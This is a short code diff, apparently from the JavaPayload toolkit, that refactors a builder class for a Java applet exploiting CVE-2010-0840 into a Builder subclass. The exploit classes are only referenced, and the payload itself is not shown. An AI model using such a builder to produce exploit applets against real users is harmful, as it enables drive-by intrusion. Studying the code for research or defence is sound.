@@ -9,12 +9,24 @@ import org.objectweb.asm.ClassVisitor;
 import org.objectweb.asm.ClassWriter;
 import org.objectweb.asm.MethodVisitor;
 
-public class CVE_2010_0840_AppletJarBuilder {
+public class CVE_2010_0840_AppletJarBuilder extends Builder {
 	public static void main(String[] args) throws Exception {
 		if (args.length == 0) {
 			System.out.println("Usage: java javapayload.builder.CVE_2010_0840_AppletJarBuilder "+JarBuilder.ARGS_SYNTAX);
 			return;
 		}
+		new CVE_2010_0840_AppletJarBuilder().build(args);
+	}
+
+	private CVE_2010_0840_AppletJarBuilder() {
+		super("Build an applet that exploits CVE-2010-0840", "Use the source, Luke!");
+	}
+	
+	public String getParameterSyntax() {
+		return JarBuilder.ARGS_SYNTAX;
+	}
+	
+	public void build(String[] args) throws Exception {
 		final Class[] baseClasses = new Class[] {
 				javapayload.exploit.CVE_2010_0840.class,
 				javapayload.exploit.CVE_2010_0840.MyAbstractMap.class,
